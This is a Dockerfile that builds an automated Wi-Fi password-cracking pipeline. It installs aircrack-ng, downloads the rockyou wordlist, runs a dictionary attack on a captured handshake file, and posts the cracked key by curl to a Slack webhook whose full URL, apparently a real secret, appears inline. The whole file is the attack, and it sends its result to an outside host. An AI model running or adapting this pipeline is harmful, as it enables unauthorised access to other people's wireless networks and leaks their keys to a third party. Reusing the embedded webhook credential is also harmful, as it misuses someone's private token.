FROM ubuntu:14.04
RUN sudo apt-get -y update
RUN sudo apt-get -y install aircrack-ng curl
COPY ./hash/ /root/
WORKDIR /root/
RUN wget http://scrapmaker.com/data/wordlists/dictionaries/rockyou.txt
RUN touch log.txt
RUN aircrack-ng 1.cap -w rockyou.txt -l log.txt
RUN cat log.txt
RUN curl -X POST -H 'Content-type: application/json' --data '{"text":"Cracked!'$(cat log.txt)' "} https://hooks.slack.com/services/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
